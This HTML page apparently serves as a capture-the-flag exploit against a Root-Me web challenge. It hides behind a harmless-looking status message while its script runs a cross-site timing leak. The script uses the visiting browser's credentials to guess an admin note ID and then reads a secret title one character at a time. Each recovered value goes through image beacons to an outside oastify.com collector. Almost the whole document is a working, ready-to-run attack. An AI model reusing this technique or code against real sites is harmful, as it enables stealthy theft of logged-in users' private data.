<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Automated XS-Leak ID Finder & Extractor</title>
</head>
<body>
    <h1>Processing safe content rendering...</h1>
    <pre id="status" style="font-family: monospace; color: blue;">Initializing session...</pre>

    <script>
        const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056";
        const COLLECTOR = "http://d3hf8gt505zvmoc493wglh73wu2lqbe0.oastify.com/?flag=";
        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_-{}";
        
        const sleep = ms => new Promise(res => setTimeout(res, ms));

        function ui(text) {
            document.getElementById("status").textContent += "\n" + text;
        }

        // Send data back to your collector
        function notify(event, message) {
            try {
                const img = new Image();
                img.referrerPolicy = "no-referrer";
                img.src = `${COLLECTOR}?ev=${encodeURIComponent(event)}&msg=${encodeURIComponent(message)}&t=${Date.now()}`;
            } catch (_) {}
        }

        // Timing probe function using fetch (no-cors)
        async function probe(path) {
            const url = `${TARGET}/${path}`;
            const t0 = performance.now();
            try {
                await fetch(url, {
                    mode: "no-cors",
                    credentials: "include",
                    cache: "no-store"
                });
            } catch (_) {}
            return performance.now() - t0;
        }

        async function startExploit() {
            ui("Starting exploit... Verifying collector connection.");
            notify("status", "Bot started execution");

            // --- STEP 1: Find the Baseline (Using a non-existent ID) ---
            ui("Calculating baseline timing for non-existent resource...");
            let baselineSum = 0;
            for (let i = 0; i < 3; i++) {
                baselineSum += await probe("notes/999999/not_found_test");
                await sleep(200);
            }
            const baseline = baselineSum / 3;
            const threshold = baseline + 1200; // Look for a significant delay (~1.2s or more)
            ui(`Baseline: ${Math.round(baseline)}ms | Target Threshold: >${Math.round(threshold)}ms`);

            // --- STEP 2: Brute-force the Note ID ---
            ui("Scanning for valid admin note ID...");
            let activeNoteId = null;
            
            // Define the ranges to check. Try low IDs first, then around your own ID.
            const candidateIds = [1, 2, 3, 4, 5, 392, 329, 427]; 
            
            for (let id of candidateIds) {
                ui(`Testing Note ID: ${id}`);
                // Probe the root of that note ID
                const dt = await probe(`notes/${id}/`);
                
                if (dt > threshold) {
                    activeNoteId = id;
                    ui(`[!] MATCH FOUND: Note ID ${id} responded in ${Math.round(dt)}ms`);
                    notify("id_found", `Successfully targeted ID: ${id}`);
                    break;
                }
                await sleep(300);
            }

            if (!activeNoteId) {
                ui("[-] Failed to automatically determine the Note ID. Defaulting to 1.");
                activeNoteId = 1;
            }

            // --- STEP 3: Leak the Note Title ---
            ui(`Beginning character exfiltration on Note ID: ${activeNoteId}`);
            let currentFlag = "";
            let cracking = true;

            while (cracking) {
                let foundCharInThisRound = false;

                for (let char of alphabet) {
                    let candidateString = currentFlag + char;
                    ui(`Trying: ${candidateString}`);
                    
                    const dt = await probe(`notes/${activeNoteId}/${encodeURIComponent(candidateString)}`);
                    
                    if (dt > threshold) {
                        currentFlag += char;
                        foundCharInThisRound = true;
                        ui(`[+] Hit found: ${currentFlag} (${Math.round(dt)}ms)`);
                        notify("hit", currentFlag);
                        await sleep(500); 
                        break; 
                    }
                    await sleep(150); 
                }

                if (!foundCharInThisRound) {
                    ui(`[=] Extraction finished. Final Value: ${currentFlag}`);
                    notify("final_flag", currentFlag);
                    cracking = false;
                }
            }
        }

        window.onload = () => { setTimeout(startExploit, 500); };
    </script>
</body>
</html>
